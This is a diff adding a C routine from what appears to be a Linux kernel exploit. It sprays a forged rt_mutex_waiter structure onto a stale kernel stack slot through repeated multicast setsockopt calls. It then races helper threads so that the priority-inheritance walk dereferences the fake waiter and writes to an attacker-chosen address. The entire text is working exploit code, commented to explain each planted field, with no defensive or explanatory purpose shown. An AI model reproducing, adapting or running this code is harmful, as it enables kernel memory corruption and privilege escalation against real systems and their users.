+/* MCAST source-group route: every setsockopt copies a full waiter word
+ * shape onto the stale rt_mutex_waiter. The group_source_req copy covers
+ * waiter - 0x60 .. waiter + 0xa8, so all fields the PI walk reads are
+ * planted; the zeroed gsr_group.ss_family makes the syscall bail with
+ * -EADDRNOTAVAIL right after the copy instead of joining a group. */
+void do_mcast_fake_lock_route(void) {
+  if (!page_base || !fake_lock || !fake_fops) {
+    route_last_step = 50;
+    route_last_errno = 0;
+    pr_warning("mcast route missing page=%016zx lock=%016zx fops=%016zx\n",
+               page_base, fake_lock, fake_fops);
+    return;
+  }
+
+  int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (fd < 0) {
+    route_last_step = 51;
+    route_last_errno = errno;
+    pr_warning("mcast route socket errno=%d\n", errno);
+    return;
+  }
+
+  int obs = observe_mode();
+  int route_ok = 0;
+  int arm_seq = TCP_ARM_SEQ;
+  int post_hold = TCP_POST_GETSOCKOPT_HOLD;
+  /* the erase relink drops the waiter's tree node with {pc = value,
+   * right = 0, left = target}; the leaf arm stores 0 through pc = target-8 */
+  uint64_t relink_pc = fake_right ? fake_right : fake_parent;
+  uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
+
+  atomic_store(&punch_consume_stop, 0);
+  atomic_store(&punch_consume_go, 0);
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+  atomic_store(&main_route_delay_usec, 0);
+
+  pr_info("mcast route enter observe=%d page=%016zx lock=%016zx "
+          "task=%016zx pc=%016zx left=%016zx attempts=%d arm=%d hold=%d\n",
+          obs, page_base, fake_lock, fake_task, (size_t)relink_pc,
+          (size_t)relink_left, MCAST_ROUTE_ATTEMPTS, arm_seq, post_hold);
+  log_sync();
+
+  unsigned char buf[MCAST_BUF_LEN];
+  for (int i = 1; i <= MCAST_ROUTE_ATTEMPTS && !route_ok; i++) {
+    int calls_before = atomic_load(&consumer_calls);
+    int success_before = atomic_load(&consumer_success);
+
+    memset(buf, 0, sizeof(buf));
+    put64(buf, MCAST_WAITER_OFF + 0x00, relink_pc);   /* tree parent_color */
+    put64(buf, MCAST_WAITER_OFF + 0x08, 0);           /* tree rb_right */
+    put64(buf, MCAST_WAITER_OFF + 0x10, relink_left); /* tree rb_left */
+    put64(buf, MCAST_WAITER_OFF + 0x18, relink_pc);   /* pi_tree parent_color */
+    put64(buf, MCAST_WAITER_OFF + 0x20, 0);           /* pi_tree rb_right */
+    put64(buf, MCAST_WAITER_OFF + 0x28, relink_left); /* pi_tree rb_left */
+    put64(buf, MCAST_WAITER_OFF + 0x30, fake_task);   /* task */
+    put64(buf, MCAST_WAITER_OFF + 0x38, fake_lock);   /* lock */
+    put32(buf, MCAST_WAITER_OFF + 0x40, 3);           /* wake_state */
+    put32(buf, MCAST_WAITER_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
+    put64(buf, MCAST_WAITER_OFF + 0x48, 0);           /* deadline */
+    put64(buf, MCAST_WAITER_OFF + 0x50, 0);           /* ww_ctx */
+
+    errno = 0;
+    int ret = setsockopt(fd, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP, buf,
+                         sizeof(buf));
+    int saved_errno = errno;
+    if (obs) {
+      pr_info("obs seq=%d ret=%d errno=%d\n", i, ret, saved_errno);
+      if (i >= 32) break;
+      continue;
+    }
+    /* the copy lands before the family check; -EADDRNOTAVAIL means the
+     * waiter shape is on the stack now */
+    if (i >= arm_seq && (ret == 0 || saved_errno == EADDRNOTAVAIL)) {
+      atomic_store(&punch_consume_go, i);
+      for (int spin = 0; spin < post_hold; spin++) {
+        __asm__ volatile("yield" ::: "memory");
+      }
+      tcp_wait_for_consumer_idle();
+    }
+
+    int calls = atomic_load(&consumer_calls);
+    int success = atomic_load(&consumer_success);
+    if (calls <= calls_before || success <= success_before) {
+      if ((i % 16) == 0 || saved_errno != EADDRNOTAVAIL) {
+        pr_info("mcast route seq=%d ret=%d errno=%d calls=%d success=%d\n",
+                i, ret, saved_errno, calls, success);
+      }
+      continue;
+    }
+    /* consumer fired: the PI walk derefed the crafted waiter and wrote. */
+    pr_info("mcast route won seq=%d\n", i);
+    route_ok = 1;
+    route_last_step = 0;
+    route_last_errno = 0;
+  }
+
+  atomic_store(&punch_consume_go, 0);
+  atomic_store(&punch_consume_stop, 1);
+  close(fd);
+  if (!route_ok && route_last_step == 0 && !obs) {
+    route_last_step = 52;
+  }
+  pr_info("mcast route done=%d observe=%d calls=%d success=%d step=%d "
+          "errno=%d\n",
+          route_ok, obs, atomic_load(&consumer_calls),
+          atomic_load(&consumer_success), route_last_step, route_last_errno);
+  log_sync();
+}
